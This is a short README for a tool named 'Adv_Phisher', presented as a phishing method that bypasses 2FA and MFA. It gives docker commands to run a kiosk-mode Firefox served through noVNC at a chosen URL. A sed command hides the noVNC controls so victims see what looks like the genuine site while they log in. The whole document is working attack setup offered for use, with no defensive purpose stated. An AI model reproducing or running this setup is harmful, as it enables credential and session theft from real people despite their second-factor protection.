# Adv_Phisher
A powerful phishing method (2FA, MFA bypass)

## Install docker

## Set-up 
1. Config Firefox
```shell
  docker run -d --name firefox -p 5800:5800 -v ~/firefox:/config:rw --shm-size=2g jlesage/firefox
```
2. Stop docker
```shell
  docker stop firefox
```
3. Delete docker

   
## Start 
Replace URL (<URL>)
```shell
  docker run -d --name firefox2 -p 5800:5800 -e FF_OPEN_URL="<URL>" -e FF_KIOSK=1 -v ~/firefox:/config:rw --shm-size=2g jlesage/firefox
```
## fix error

```shell
  docker exec firefox2 sed -i "s|</head>|<style>#noVNC_control_bar,#noVNC_control_bar_handle,.noVNC_panel{display:none!important;}</style></head>|" /opt/noVNC/index.html
```

